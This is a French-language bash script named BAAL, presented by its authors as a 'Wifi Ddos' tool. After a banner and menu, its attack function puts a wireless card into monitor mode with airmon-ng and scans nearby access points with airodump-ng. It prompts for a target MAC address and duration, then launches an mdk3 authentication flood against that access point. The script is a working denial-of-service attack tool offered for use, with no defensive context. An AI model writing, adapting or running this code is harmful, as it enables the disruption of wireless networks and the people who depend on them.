#!/bin/bash

# BAAL V 1.0b
# Date: 30/12/2016
# Dev: Shell
# Auteurs: KURO/Z0MB13.D0LL

#### Configuration ################################################################################
mon="mon"
local PID=$1

#### Colors #######################################################################################

blanc="\033[1;37m"
gris="\033[0;37m"
rouge="\033[1;31m"
vert="\033[1;32m"
jaune="\033[1;33m"

nar=" Choisissez une option "
Titre=" Baal v1.0b "

###### CONFIG FIN ##############################################################################

#### INTRO ########################################################################

function PRE {

	clear
	echo
	sleep 0.3
	echo -e "	$rouge ██████╗"$blanc"  █████╗  █████╗ ██╗ "    
	sleep 0.3
	echo -e "	$rouge ██╔══██╗"$blanc"██╔══██╗██╔══██╗██║  "   
	sleep 0.1	
	echo -e "	$rouge ██████╔╝"$blanc"███████║███████║██║ "    
	sleep 0.1	
	echo -e "	$rouge ██╔══██╗"$blanc"██╔══██║██╔══██║██║  "   
	sleep 0.1	
	echo -e "	$rouge ██████╔╝"$blanc"██║  ██║██║  ██║███████╗"
	sleep 0.1	
	echo -e "	$rouge ╚═════╝ "$blanc"╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝$gris v$vert""1.0 "	
	sleep 0.5
	echo
	echo -e "       $rouge B$blanc""AAL Wifi Ddos$vert By$jaune KU$rouge""RO $blanc&$rouge Z$blanc""0MB13-$rouge""D$blanc""OLL"
	sleep 3
	main

}

############ INTRO FIN #######################################################################



######## MENU 1 ######################################################################

function main {

	clear

	echo

	top

	echo
	echo
	echo -e " $blanc$nar"
	echo -e " 
		  $vert 1)$blanc Info
		  $vert 2)$blanc BAAL 
		  $rouge 0)$blanc Fermer le programme "
	echo
	read -p " Choix: " choix
		case $choix in
			1) information;;
			2) ATTACK;;
			0) EXITMENU;;
			*) echo -e "$Blanc [$rouge ERREUR$blanc ]" && sleep 3
		esac
	
main
}

####### MENU 1 FIN ##########################################################################

### INFO #####################################################################################

function information {

	clear

	echo

	top

	echo	
	echo -e "$vert	Nom:$blanc......Baal"
	sleep 0.2
	echo -e "$vert	Version:$blanc..1.0 Beta"
	sleep 0.2
	echo -e "$vert	Langue:$blanc.........[FR]"
	sleep 0.2
	echo -e "$vert	Date:$blanc.....30/12/2016"
	sleep 0.2
	echo -e "$vert	Auteurs:$blanc...KURO & Z0MB13.D0LL"
	sleep 0.2
	echo -e "$vert	Type:$blanc.....Ddos Wifi"
	sleep 0.2
	echo -e "$vert	Dev:$blanc......Shell "
	echo
	echo
	sleep 0.5 
	echo -e " Faire$rouge [ENTREE]"
	read pause		 
main
}

###### INFO FIN ###################################################################################

######### Fonction Attack #####################################################################

function ATTACK {
	
	clear

	mkdir BAALTMP
	TMP="BAALTMP"

	top
	echo 
	echo -e " Choisissez une carte (exp: wlan0)"
	echo
	ifconfig | grep -a 'wlan' | awk '{print $1}'
	echo
	read -p "Carte: " device
	airmon-ng check kill
	airmon-ng start $device
	sleep 2
	airodump-ng $device$mon &> $TMP/DUMP.csv
	
	
	sleep 2
	echo 

	CIBLE=`cat $TMP/DUMP.csv`
		
	echo -e "$CIBLE"

	echo -e " Entrez l'adresse MAC de la cible "
	echo
	read -p " MAC: " MAC
	
	
	clear
	echo
	clear
	echo
	top
	echo
	echo -e " Entrez la durée de l'attaque (exp: 60, pour 60 secondes)"
	echo
	read -p " Temps: " TIME
	
	touch 
	echo -e "#!/bin/sh
xterm -e \"timeout $TIME mdk3 $device$mon a -a $MAC -m\"">> $TMP/MDK
	top
	echo
	echo -e " Lancez l'attaque"
	echo
	read -p " FIRE!!! "
	echo

	top
	chmod +x $TMP/MDK
	$TMP/./MDK
	
	echo -e "$rouge Attaque terminée$blanc"
	sleep 3 
	rm -Rf $TMP
	
	airmon-ng stop $device$mon
	echo -e ""$blanc"["$rouge"X"$blanc"] "$blanc"Kill "$gris"airmon-ng"$transparent""
	sleep 2	
	service network-manager start
	echo -e ""$blanc"["$rouge"*"$blanc"] "$blanc"redemarrage du service "$gris"Network-manager"$transparent""
	sleep 1

main

}

######## FONCTION ATTAQUE FIN ####################################################################


##### Fonction Top ########################################################################

function top {

	clear
	echo
	sleep 0.1 
	echo -e " $blanc~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~" 
	echo -e " $rouge 	B$blanc A A L $gris  v$vert 1.0 " 
	echo -e " $blanc~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	sleep 0.5
	echo

}

#### FONTION TOP FIN ########################################################################


##### FERMETURE DU PROGRAMME ###############################################################

function EXITMENU {

	clear
	echo
	top
	echo -e "$blanc Fermeture du programme..."
	sleep 2
	echo
	sleep 0.5
	echo
	echo -e " [$rouge*$blanc] $vert Merci d'avoir utiliser$rouge B$blanc""AAL$blanc [$rouge*$blanc]"
	sleep 3
	clear
	exit
}

###### FIN (END) #######################################################################

PRE

